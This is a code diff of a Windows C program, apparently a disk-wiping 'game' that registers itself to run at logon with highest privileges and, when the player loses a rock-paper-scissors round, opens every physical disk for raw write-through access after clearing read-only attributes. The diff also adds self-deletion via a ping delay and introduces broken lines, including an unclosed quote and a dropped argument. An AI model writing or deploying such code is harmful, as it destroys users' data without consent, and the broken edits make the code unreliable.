@@ -4,10 +4,12 @@
 #include <time.h>
 #include <stdlib.h>
 #include <winioctl.h>
+#include <ntdddisk.h>
+
 
 // note*
 // this is the most destruction you can do in ring3 but..
-// this wont effect offline disks or hardware/kernal-protected disks
+// this wont effect offline disks or hardware/offline-protected disks
 
 // schedules self on logon with highest priviliges 
 void task_sch() {
@@ -17,11 +19,25 @@ void task_sch() {
     if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
         return;
     }
+
     sprintf(cmd, 
-        "schtasks /create /sc onlogon /tn \"game\" /tr \"%s payload\" /rl highest /f", 
+        "schtasks /create /sc onlogon /tn \"game" /tr \"%s payload\" /rl highest /f", 
         exepath);
     system(cmd);
     
+}
+// so if you win your system isnt destroyed
+void safe() {
+    system("schtasks /delete /tn \"game\" /f");
+    
+    //delete itself
+    //uses localhost as a delay method 
+    char cmd[MAX_PATH + 64];
+    GetModuleFileNameA(NULL, cmd, MAX_PATH);
+    char rm_cmd[MAX_PATH + 128];
+    sprintf(rm_cmd,
+    "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+    system(rm_cmd);
 }
 void game() {
     SetConsoleTitleA("Screen");
@@ -46,21 +62,9 @@ void game() {
 	} else if (rps == -1) {printf("you lost :(\n");
 	} else if (rps == 0) {printf("tie, you lost :(\n"); }
 }
-// so if you win your system isnt destroyed
-void safe() {
-    system("schtasks /delete /tn \"game\" /f");
-    
-    //delete itself
-    //uses localhost as a delay method 
-    char cmd[MAX_PATH + 64];
-    GetModuleFileNameA(NULL, cmd, MAX_PATH);
-    char rm_cmd[MAX_PATH + 128];
-    sprintf(rm_cmd,
-    "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
-    system(rm_cmd);
-}
 
-//1. scans >32 disks 
+
+//1. scans < 32 disks 
 //2. opens each direct, unbuffered i/o
 //3. clear *software* read-only attributes -> "IOCTL_DISK_SET_DISK_ATTRIBUTES"
 //4. finds drive size
@@ -87,7 +91,7 @@ void payload() {
             NULL, 
             OPEN_EXISTING,
             FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, //more like diskpart clean all
-            0, NULL
+            0
         );
         if (hDisk == INVALID_HANDLE_VALUE) continue;
 
